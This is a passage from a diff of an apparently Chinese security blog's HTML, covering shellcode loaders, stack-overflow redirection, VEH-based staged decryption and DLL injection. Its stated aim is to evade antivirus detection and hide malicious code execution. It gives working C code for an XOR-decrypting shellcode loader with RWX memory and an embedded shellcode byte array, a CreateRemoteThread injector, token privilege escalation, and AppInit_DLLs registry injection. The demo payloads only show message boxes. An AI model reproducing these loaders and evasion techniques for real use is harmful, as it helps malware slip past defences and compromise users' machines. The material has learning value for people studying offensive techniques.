+	//将shellcode复制到内存中
+	memcpy(Memory, shellcode, sizeof(shellcode));
+	//解密函数
+	for (int i = 0; i &lt; sizeof(shellcode); ++i)
+	{
+		*((char*)Memory + i) ^= 0x23;
+	}
+
+	////DWORD dold;
+	////VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &amp;dold);
+
+	////强制转换为函数
+	((void(*)())Memory)();
+
+	return 0;
+}</code></pre>
+
+<p>因为杀毒软件可能将代码上传到云端跑（因为存在一些敏感行为，VirtualProtect等），这时候我们的shellcode可能被识别，所以我们要避免VirtualProtect操作，那么如何创建可读可写可执行的段呢。这时候就用到了预处理#pragma</p>
+<pre class="language-c" data-language="c"><code class="language-c">#include&lt;windows.h&gt;
+#include&lt;stdio.h&gt;
+#pragma data_seg("vdata")
+unsigned char  shellcode[] =
+"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
+"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
+"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
+"\x49\x0C\x8B\x09\x8B\x09\x8B\x69\x18\xAD\x3D\x6A\x0A\x38\x1E\x75"
+"\x05\x95\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD"
+"\x8B\x59\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE"
+"\x06\x3A\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24"
+"\x1C\x75\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03"
+"\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9"
+"\x33\xDB\x53\x68\x74\x20\x00\x00\x68\x69\x6b\x61\x73\x68\x53\x61"
+"\x6e\x64\x8B\xC4\x53\x50\x50\x53\xFF\x57\xFC\x8B\xE6\xC3";
+#pragma data_seg()//创建段，名称为vdata
+#pragma comment(linker,"/SECTION:vdata,RWE")//修改段的属性
+int main()
+{
+	//分配内存，并设置为可读可写可执行，大小为shellcode的大小
+	LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
+	if (Memory == NULL)//当开辟失败时，直接结束
+	{
+		return 1;
+	}
+	//将shellcode复制到内存中
+	memcpy(Memory, shellcode, sizeof(shellcode));
+	//DWORD dold;
+	//VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &amp;dold);
+
+	//强制转换为函数
+	((void(*)())Memory)();
+	return 0;
+}</code></pre>
+
+<h2 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h2><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649557566937.png"></p>
+<h1 id="0x06-栈溢出"><a href="#0x06-栈溢出" class="headerlink" title="0x06-栈溢出"></a>0x06-栈溢出</h1><h2 id="栈溢出基础"><a href="#栈溢出基础" class="headerlink" title="栈溢出基础"></a>栈溢出基础</h2><p>首先要先了解X86栈和函数调用的机制</p>
+<p>首先先把call的下一条地址压入栈中，再把ebp压入栈，最后提升栈底，也就是mov ebp,esp，而函数内部的变量起始地址是ebp-0x04，依次往后，当给变量赋值过大的值时，可能会覆盖函数结束时ret的值，进而执行我们的shellcode</p>
+<blockquote>
+<p>数组的赋值是从低地址往高地址赋值</p>
+</blockquote>
+<p>所以我们可以通过数组越界覆盖ret原本的地址</p>
+<p>代码</p>
+<pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;
+#include&lt;Windows.h&gt;
+#include&lt;iostream&gt;
+//#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
+void Decshellcode()
+{
+	//完成恶意代码的释放、解密、执行
+	MessageBoxA(0, "不要再打了", "我错了", MB_OK);
+}
+#pragma optimize("",off)
+int main()
+{
+	int a = 2022;//0
+	int arr[2] = { 1,2 };//1,2
+	int ti = 23;//3
+	arr[5] = (int)Decshellcode;
+	return 0;
+}
+#pragma optimize("",on)</code></pre>
+
+<p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649578699864.png"></p>
+<p>这里会先把0xD61212压入栈中</p>
+<p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649578767663.png"></p>
+<p>然后将ebp的值压入栈</p>
+<p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649578844982.png" alt="ebp入栈"></p>
+<p>提升栈底就不看了，来看变量的赋值过程，可以看到是从栈底往低地址压入的</p>
+<p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649579064005.png"></p>
+<p><strong>数组入栈</strong></p>
+<p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649579162383.png"></p>
+<p>可以看到这里是不一样的，数组下标小的元素在低地址，所以可以通过数组越界覆盖原本压入的call下一条地址</p>
+<p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649579335339.png"></p>
+<p>arr[0]是首元素，那么arr[5]对应的就是ret的地址</p>
+<pre class="language-c" data-language="c"><code class="language-c">arr[5] = (int)Decshellcode;</code></pre>
+
+<p>将shellcode的地址覆盖ret的地址</p>
+<p>注意要有一个值占用arr[4]的值，或者直接使用arr[4]访问即可。</p>
+<h2 id="分析利用"><a href="#分析利用" class="headerlink" title="分析利用"></a>分析利用</h2><p>因为在Main函数中执行恶意代码是很容易被察觉的，所以我们要阻断Main函数和恶意代码的联系</p>
+<p>我们需要做到既不调用函数，又能让函数执行，即栈溢出</p>
+<pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;
+#include&lt;Windows.h&gt;
+void Decshellcode()
+{
+	//完成恶意代码的释放、解密、执行
+	MessageBoxA(0, "不要再打了", "我错了", MB_OK);
+}
+#pragma optimize("",off)
+int main()
+{
+	int a = 2022;
+	int arr[2] = { 1,2 };
+	int ti = 23;
+	arr[5] = (int)Decshellcode;
+	//return 0;
+}
+#pragma optimize("",on)</code></pre>
+
+<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649559630756.png"></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>为什么会执行呢，我们知道调用函数在汇编中要有call，但是我们并没有发现call指令</p>
+<p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649559733763.png"></p>
+<h1 id="0x07-shellcode的加密与释放"><a href="#0x07-shellcode的加密与释放" class="headerlink" title="0x07-shellcode的加密与释放"></a>0x07-shellcode的加密与释放</h1><p>即使我们对shellcode代码进行了加密，但是我们的shellcode一定会被解密并释放出来，这时候就难以绕过检测，所以我们要将我们的shellcode执行完就被擦除掉，让其不留痕迹。</p>
+<p>这时候就需要异常处理机制（VEH）和栈溢出同时利用，对逐条恶意代码指令进行解密，然后调用，注意再每条指令最后加上CC，然后解密完代码后再重新指向llcode，让其触发异常。</p>
+<p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649571545227.png"></p>
+<pre class="language-c" data-language="c"><code class="language-c">#include&lt;Windows.h&gt;
+#include&lt;stdio.h&gt;
+#pragma data_seg("ldata")
+
+char trapcode[] = "*";
+unsigned long long llcode = 204;//CC 00 00 00INT3
+#pragma data_seg()
+#pragma comment(linker,"/SECTION:ldata,RWE")
+void Decshellcode()
+{
+
+	llcode = 0xF333333333333333;
+	llcode &lt;&lt;= 2;
+	char* data = (char*)&amp;llcode;
+	/*
+	* 解密shellcode 并且执行
+	* len 解密后的指令长度
+	* data 把解密后的指令写入data
+	* 比如 push ebp 就向data写入0x55
+	* 每次解密一条指令 不要用超过7字节的指令和跳转指令
+	*/
+	MessageBoxA(0, "不要再打辣", "停下", MB_OK);
+	return ;
+}
+long _stdcall ExceptionHandle(PEXCEPTION_POINTERS val)
+{
+	if (val-&gt;ExceptionRecord-&gt;ExceptionCode == STATUS_BREAKPOINT)
+	{
+		Decshellcode();
+		val-&gt;ContextRecord-&gt;Eip = (DWORD)&amp;llcode;
+		return EXCEPTION_CONTINUE_EXECUTION;
+	}
+	else
+		return EXCEPTION_CONTINUE_SEARCH;
+}
+
+#pragma optimize("",off)
+int main()
+{
+	AddVectoredExceptionHandler(1, ExceptionHandle);
+	int bilibili = 2020;
+	int arr[2] = { 1,2 };
+	int ti = 23;
+	arr[5] = (int)&amp;llcode;
+	return 0;
+}
+#pragma optimize("",on)</code></pre>
+
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hdtianfu/archive/2011/12/27/2303113.html">https://www.cnblogs.com/hdtianfu/archive/2011/12/27/2303113.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-190668.htm">https://bbs.pediy.com/thread-190668.htm</a></p>
+<p>AddVectoredExceptionHandler是异常处理机制try和except的封装，val-&gt;ExceptionRecord-&gt;ExceptionCode记录着异常的类型</p>
+<p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649581840737.png"></p>
+<p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649581929518.png"></p>
+<p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649582032897.png"></p>
+<h1 id="shellcode注入"><a href="#shellcode注入" class="headerlink" title="shellcode注入"></a>shellcode注入</h1><p>当然shellcode注入不止这种，还有其他的方法</p>
+<p><a target="_blank" rel="noopener" href="https://myzxcg.com/2022/01/Windows-Shellcode-%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF/?msclkid=cfc9dbb7ba0c11ec874f49e6a2567021">https://myzxcg.com/2022/01/Windows-Shellcode-%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF/?msclkid=cfc9dbb7ba0c11ec874f49e6a2567021</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1787191">https://cloud.tencent.com/developer/article/1787191</a></p>
+<p>shellcode加密</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LyShark/p/13033722.html">https://www.cnblogs.com/LyShark/p/13033722.html</a></p>
+<h1 id="0x08-隐藏API"><a href="#0x08-隐藏API" class="headerlink" title="0x08-隐藏API"></a>0x08-隐藏API</h1><p>利用栈溢出隐藏API</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://gift1a.github.io/2022/04/09/DLL%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Gift1a">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/04/09/DLL%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">DLL注入</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-04-09 21:31:05" itemprop="dateCreated datePublished" datetime="2022-04-09T21:31:05+08:00">2022-04-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-04-14 18:43:56" itemprop="dateModified" datetime="2022-04-14T18:43:56+08:00">2022-04-14</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
     
-    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="0x00-远程线程注入"><a href="#0x00-远程线程注入" class="headerlink" title="0x00-远程线程注入"></a>0x00-远程线程注入</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>线程注入，是通过开启远程线程的方式，将DLL加载到目标宿主进程中的常用方式。</p>
+<p>由于WinNT系统下进程空间的独立性，获取其他进程的信息，就需要进入目标进程空间的方式，而使用线程注入可以轻松实现。</p>
+<blockquote>
+<p>使用LoadLibrary动态加载DLL</p>
+<p>使用GetProcAddress获取DLL中导出函数的指针</p>
+</blockquote>
+<h3 id="DLL的分类"><a href="#DLL的分类" class="headerlink" title="DLL的分类"></a>DLL的分类</h3><p>在VS的编译环境下，DLL又分为三类：</p>
+<blockquote>
+<p>非MFC的DLL——即使用SDK API进行编程，能被其他所有语言调用</p>
+<p>MFC规则DLL——可以使用MFC进行编程，能被其他所有语言调用</p>
+<p>MFC扩展DLL——可以使用MFC进行编程，但只能被用MFC编写的程序调用</p>
+</blockquote>
+<p>MFC——Microsoft Foundation Class-Library是微软用C++对API进行的封装，全部封装成了类，简化了使用</p>
+<h3 id="DLL的入口点和参数"><a href="#DLL的入口点和参数" class="headerlink" title="DLL的入口点和参数"></a>DLL的入口点和参数</h3><pre class="language-c" data-language="c"><code class="language-c">BOOL WINAPI DllMain(
+    HINSTANCE hinstDLL,  // handle to DLL module
+    DWORD fdwReason,     // reason for calling function
+    LPVOID lpReserved )  // reserved
+{
+    // Perform actions based on the reason for calling.
+    switch( fdwReason ) 
+    { 
+        case DLL_PROCESS_ATTACH:
+         // Initialize once for each new process.进程第一次链接DLL并通过它的入口点会得到这个参数
+         // Return FALSE to fail DLL load.
+            break;
+
+        case DLL_THREAD_ATTACH:
+         // Do thread-specific initialization.进程在空间中取消DLL的映射时会得到这个参数
+            break;
+
+        case DLL_THREAD_DETACH:
+         // Do thread-specific cleanup.每当新线程创建时，系统会对所有映射的DLL传入此参数调用入口函数
+            break;
+
+        case DLL_PROCESS_DETACH:
+         // Perform any necessary cleanup.每当线程退出或者返回时时，系统会对所有映射的DLL传入此参数要求执行对应清理工作
+            break;
+    }
+    return TRUE;  // Successful DLL_PROCESS_ATTACH.
+}</code></pre>
+
+<h2 id="DLL编写与导出"><a href="#DLL编写与导出" class="headerlink" title="DLL编写与导出"></a>DLL编写与导出</h2><p>DLL的导出函数使用</p>
+<blockquote>
+<p>extern “C” _declspec(dllexport)</p>
+</blockquote>
+<p>DLL的导入函数使用</p>
+<blockquote>
+<p>extern “C” _declspec(dllimport)</p>
+</blockquote>
+<p>其中，extern “C”作为一种编译约定，表示按照C语言的方式导出</p>
+<blockquote>
+<p> 由于C++支持函数重载，因此编译器编译函数的过程中会将函数的参数类型也加到编译后的代码中，而不仅仅是函数名；而C语言并不支持函数重载，因此编译C语言代码的函数时不会带上函数的参数类型，一般只包括函数名。 这样我们就可以直接通过函数名对DLL导出函数进行调用</p>
+</blockquote>
+<h3 id="DLL动态加载"><a href="#DLL动态加载" class="headerlink" title="DLL动态加载"></a>DLL动态加载</h3><p>既然我们要把DLL注入到进程中，那么需要先了解一下，进程是怎样调用DLL的</p>
+<pre class="language-c" data-language="c"><code class="language-c">//使用LoadLibrary加载所需的DLL
+//LoadLibraryA和LoadLibraryW分别对应ANSI编码下和Unicode编码下，因为一般都是Unicode，所以一般用w，路径记得改为\\
+HMODULE hMod = LoadLibraryA(DLL路径);
+
+//定义导入函数指针
+
+typedef int (*ADD_IMPORT)(int a,int b);//定义一个返回值为int型的函数指针,这样ADD_IMPORT就是一个函数指针
+
+//使用GetProcAddress获取函数入口点
+
+ADD_IMPORT add_proc=(ADD_IMPORT)GetProcAddress(hMod,"ADD");
+
+//直接调用
+
+int result = add_proc(1,2);
+
+//释放句柄
+FreeLibrary(hMod);</code></pre>
+
+<h2 id="线程注入"><a href="#线程注入" class="headerlink" title="线程注入"></a>线程注入</h2><h3 id="注入的可行性"><a href="#注入的可行性" class="headerlink" title="注入的可行性"></a>注入的可行性</h3><blockquote>
+<p>kernel32.dll和user32.dll是两个在大部分程序上都会调用的DLL</p>
+<p>同一个DLL，在不同进程中不一定被映射（加载）在同一个内存地址下</p>
+<p>但是kernel32.dll和user32.dll除外，它们总是被映射到进程的内存首选地址</p>
+<p>因此在所有使用这两个DLL的进程中，这两个DLL的内存地址是相同的</p>
+<p>因此<strong>我们在本进程获取的kernel32.dll中函数的地址，在目标进程也是一样的</strong></p>
+</blockquote>
+<h3 id="线程注入过程"><a href="#线程注入过程" class="headerlink" title="线程注入过程"></a>线程注入过程</h3><blockquote>
+<p>目标进程-&gt;开辟并传入DLL地址-&gt;开启远程线程-&gt;加载DLL-&gt;实现DLL的注入</p>
+</blockquote>
+<p>依次使用以下函数</p>
+<pre class="language-c" data-language="c"><code class="language-c">OpenProcess()//获取目标进程的句柄
+VirtualAllocEx()//在进程中申请空间
+WriteProcessMemory()//向进程中写入DLL路径
+GetProcAddress()//取得函数LoadLibrary在DLL中的地址
+CreateRemoteThreadEx()//在目标进程中创建新线程使用LoadLibrary加载DLL
+WaitForSingleObject()//挂起线程，可以传递INFINITE指明要无限期等待下去，等待线程执行完再执行下一步
+CloseHandle()//关闭句柄</code></pre>
+
+<p> CreateRemoteThread()函数</p>
+<pre class="language-c" data-language="c"><code class="language-c">HANDLE WINAPI CreateRemoteThread(
+    LPSECURITY_ATTRIBUTES   lpThreadAttributes, //线程安全相关的属性，常置为NULL
+    SIZE_T                  dwStackSize,        //新线程的初始化栈在大小，可设置为0
+    LPTHREAD_START_ROUTINE  lpStartAddress,     //被线程执行的回调函数，也称为线程函数
+    LPVOID                  lpParameter,        //传入线程函数的参数，不需传递参数时为NULL
+    DWORD                   dwCreationFlags,    //控制线程创建的标志
+    LPDWORD                 lpThreadId          //传出参数，用于获得线程ID，如果为NULL则不返回线程ID
+);</code></pre>
+
+<p>目标其实就是让目标进程调用<code>LoadLibrary()</code>加载dll </p>
+<blockquote>
+<p>将线程函数指定为LoadLibrary()函数，并且把DLL加载地址传递给线程参数，这样就在目标进程中成功调用了FreeLibrary函数</p>
+<p>CreateRemoteThread()原意是在外部进程调用执行线程函数，不过这里的线程函数换成了FreeLibrary()</p>
+</blockquote>
+<p>Inject.cpp</p>
+<pre class="language-c" data-language="c"><code class="language-c">#include "windows.h"
+#include "tchar.h"
+
+BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath)
+{
+    HANDLE hProcess = NULL, hThread = NULL;
+    HMODULE hMod = NULL;
+    LPVOID pRemoteBuf = NULL;
+
+    //确定路径需要占用的缓冲区大小
+    DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);
+    LPTHREAD_START_ROUTINE pThreadProc;
+
+    // #1. 使用OpenProcess函数获取目标进程句柄（PROCESS_ALL_ACCESS权限）
+    if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))
+    {
+        _tprintf(L"OpenProcess(%d) failed!!! [%d]\n", dwPID, GetLastError());
+        return FALSE;
+    }
+
+    // #2. 使用VirtualAllocEx函数在目标进程中分配内存，大小为szDllName
+      // VirtualAllocEx函数返回的是hProcess指向的目标进程的分配所得缓冲区的内存地址,最后一个参数表示开辟内存的属性
+    pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);
+
+    // #3.  将myhack.dll路径 ("c:\\myhack.dll")写入目标进程中分配到的内存
+    WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL);
+
+    // #4. 获取LoadLibraryA() API的地址
+      // 这里主要利用来了kernel32.dll文件在每个进程中的加载地址都相同这一特点，所以不管是获取加载到   
+      // InjectDll.exe还是notepad.exe进程的kernel32.dll中的LoadLibraryW函数的地址都是一样的。这里的加载地
+      // 址相同指的是在同一次系统运行中，如果再次启动系统kernel32.dll的加载地址会变，但是每个进程的
+      // kernerl32.dll的加载地址还是一样的。
+    hMod = GetModuleHandle(L"kernel32.dll");
+    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, "LoadLibraryW");
+
+    // #5. 在目标进程notepad.exe中运行远程线程
+      // pThreadProc = notepad.exe进程内存中的LoadLibraryW()地址
+      // pRemoteBuf = notepad.exe进程内存中待加载注入dll的路径字符串的地址
+    hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);
+    WaitForSingleObject(hThread, INFINITE);
+
+    //同样，记得关闭句柄
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+
+    return TRUE;
+}
+
+int _tmain(int argc, TCHAR* argv[])
+{
+    if (argc != 3)
+    {
+        _tprintf(L"USAGE : %s &lt;pid&gt; &lt;dll_path&gt;\n", argv[0]);
+        return 1;
+    }
+
+    // inject dll
+    if (InjectDll((DWORD)_tstol(argv[1]), argv[2]))
+        _tprintf(L"InjectDll(\"%s\") success!!!\n", argv[2]);
+    else
+        _tprintf(L"InjectDll(\"%s\") failed!!!\n", argv[2]);
+
+    return 0;
+}</code></pre>
+
+<p>inject.dll</p>
+<pre class="language-c" data-language="c"><code class="language-c">// dllmain.cpp : 定义 DLL 应用程序的入口点。
+#include "pch.h"
+#include&lt;windows.h&gt;
+#include&lt;stdio.h&gt;
+extern "C" _declspec(dllexport) void Print()
+{
+    printf("helloworld");
+}
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                     )
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+        MessageBoxA(0, "注入成功", "Hint", MB_OK);
+        break;
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}</code></pre>
+
+<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="/2022/04/09/DLL%E6%B3%A8%E5%85%A5/1649655410419.png"></p>
+<p>可以看到在notepad.exe的进程中注入了inject.dll</p>
+<p><img src="/2022/04/09/DLL%E6%B3%A8%E5%85%A5/1649655358785.png"></p>
+<h3 id="附"><a href="#附" class="headerlink" title="附"></a>附</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiewneqi/article/details/4683888?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~TopBlog-1.topblog&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~TopBlog-1.topblog&amp;utm_relevant_index=1">https://blog.csdn.net/xiewneqi/article/details/4683888?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ETopBlog-1.topblog&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ETopBlog-1.topblog&amp;utm_relevant_index=1</a></p>
+<p>有时候需要提升进程权限</p>
+<blockquote>
+<p>在枚举/结束系统进程/或操作系统服务时，会出现自己权限不足而失败的情况，这时就需要提升自己进程到系统权限</p>
+</blockquote>
+<h4 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h4><blockquote>
+<p><strong>Windows的每个用户登录时，系统会产生一个访问令牌(access token)，其中关联了当前用户的权限信息，用户登录后创建的每一个进程都含有用户access token的拷贝。当进程试图执行某些需要特殊权限的操作或者是访问受保护的内核对象时，系统会检查其access token中的权限信息以决定是否授权操作。</strong></p>
+</blockquote>
+<p>Administrator组成员的access token中会含有一些可以执行系统级操作的特权(privileges)，如终止任意进程、关闭\重启系统、加载设备驱动和更改系统时间等，不过这些权限默认是被禁用的</p>
+<p> 当Administrator组成员创建的进程中包含一些需要特权的操作时，进程必须首先打开这些禁用的特权以提升自己的权限，否则系统将拒绝进程的操作。 </p>
+<blockquote>
+<p><strong>windows以字符串的形式表示系统特权，如”SeCreatePageFilePrivilege“表示该特权用于创建页面文件，”SeDebugPrivilege“表示该特权可用于调试及更改其他进程的内存，为了方便使用这些字符串，微软在winnt.h定义了一组宏，如#define SE_DEBUG_NAME TEXT(“SeDebugPrivilege”)</strong></p>
+</blockquote>
+<p><img src="/2022/04/09/DLL%E6%B3%A8%E5%85%A5/1649725957948.png" alt="权限列表"></p>
+<p>在vs的定义也可以看到，这些宏定义对应了不同的权限，可以使用LookupPrivilege函数得到对应权限的LUID</p>
+<blockquote>
+<p><strong>虽然Windows使用字符串表示特权，但查询或更改特权的API需要LUID来引用相应的特权，LUID表示 local unique identifier ，在系统中是唯一的。为了提升进程权限到指定的特权，我们必须找到特权对应的LUID，这时候就需要调用LookupPrivilege函数，获取到特权对应的LUID时，我们要打开该特权，此时要用到LUID_AND_ATTRIBUTES结构</strong></p>
+</blockquote>
+<p>其定义如下</p>
+<pre class="language-c" data-language="c"><code class="language-c">typedef struct _LUID_AND_ATTRIBUTES {
+    LUID Luid;
+    DWORD Attributes;
+} LUID_AND_ATTRIBUTES, * PLUID_AND_ATTRIBUTES;</code></pre>
+
+<p>当Attributes的值取SE_PRIVILEGE_ENABLED时将打开LUID对应的特权。设置完成后</p>
+<blockquote>
+<p><strong>AdjustTokenPrivileges函数通知操作系统将指定的access token权限中的特权置为打开状态，前面我们说过，进程执行需要特列权限的操作时，系统将检查其access token，因此更改了进程的access token特权设置，也就是更改了所属进程的特权设置</strong></p>
+</blockquote>
+<p>函数定义如下</p>
+<pre class="language-c" data-language="c"><code class="language-c">BOOL WINAPI AdjustTokenPrivileges(
+  __in          HANDLE TokenHandle,
+  __in          BOOL DisableAllPrivileges,
+  __in_opt      PTOKEN_PRIVILEGES NewState,
+  __in          DWORD BufferLength,
+  __out_opt     PTOKEN_PRIVILEGES PreviousState,
+  __out_opt     PDWORD ReturnLength
+);</code></pre>
+
+<p>TokenHandle是要更改特权设置的access token的句柄，DisableAllPrivileges表示是否禁用该access token的所有特权，NewState用来传递新的特权设置，注意它的类型是PTOKEN_PRIVILEGES，它是TOKEN_PRIVILEGES结构的指针</p>
+<p>TOKEN_PRIVILEGES定义如下</p>
+<pre class="language-c" data-language="c"><code class="language-c">typedef struct _TOKEN_PRIVILEGES {
+    DWORD PrivilegeCount;
+    LUID_AND_ATTRIBUTES Privileges[ANYSIZE_ARRAY];
+} TOKEN_PRIVILEGES, *PTOKEN_PRIVILEGES;</code></pre>
+
+<blockquote>
+<p><strong>其中ANYSIZE_ARRAY被定义为1，可以看到TOKEN_PRIVILEGES中包含了用于设置特权信息的LUID_AND_ATTRIBUTES结构，在使用时，只需要将PrivilegeCount赋为1，然后把Privileges数组的第1个元素（Privileges[0]）的Luid域设置为指定特权的Luid，再将其Attributes域设置为SE_PRIVILEGE_ENABLED，就可以完成TokenHandle表示的access token权限的提升了</strong></p>
+</blockquote>
+<pre class="language-c" data-language="c"><code class="language-c">BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
+{
+	TOKEN_PRIVILEGES tp;
+	HANDLE hToken;
+	LUID luid;
+	//获取当前进程的access token句柄
+	if (!OpenProcessToken(GetCurrentProcess(),
+		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
+		&amp;hToken))
+	{
+		_tprintf(L"OpenProcessToken error: %u\n", GetLastError());
+		return FALSE;
+	}
+	//查找newprivileges参数对应的Luid，并将结果写入tp.Privileges[0]的Luid域中
+	if (!LookupPrivilegeValue(NULL,           // lookup privilege on local system
+		lpszPrivilege,  // privilege to lookup 
+		&amp;luid))        // receives LUID of privilege
+	{
+		_tprintf(L"LookupPrivilegeValue error: %u\n", GetLastError());
+		return FALSE;
+	}
+	//设置tp的结构
+	tp.PrivilegeCount = 1;
+	tp.Privileges[0].Luid = luid;
+	if (bEnablePrivilege)
+		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+	else
+		tp.Privileges[0].Attributes = 0;
+	//通知操作系统更改权限
+	// Enable the privilege or disable all privileges.
+	if (!AdjustTokenPrivileges(hToken,
+		FALSE,
+		&amp;tp,
+		sizeof(TOKEN_PRIVILEGES),
+		(PTOKEN_PRIVILEGES)NULL,
+		(PDWORD)NULL))
+	{
+		_tprintf(L"AdjustTokenPrivileges error: %u\n", GetLastError());
+		return FALSE;
+	}
+
+	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
+	{
+		_tprintf(L"The token does not have the specified privilege. \n");
+		return FALSE;
+	}
+
+	return TRUE;
+}</code></pre>
+
+<h1 id="0x01-注册表注入"><a href="#0x01-注册表注入" class="headerlink" title="0x01-注册表注入"></a>0x01-注册表注入</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>Windows操作系统的注册表默认提供了AppInit_DLLs与LoadAppInit_DLLs两个注册表项</p>
+<p><img src="/2022/04/09/DLL%E6%B3%A8%E5%85%A5/1649658626858.png"></p>
+<p>在注册表编辑器中，将要注入的DLL路径字符串写入AppInit_DLLs项目，然后把LoadAppInit_DLLs的项目值设置为1.重启后，指定DLL会注入所有进程。</p>
+<p><img src="/2022/04/09/DLL%E6%B3%A8%E5%85%A5/1649658441593.png"></p>
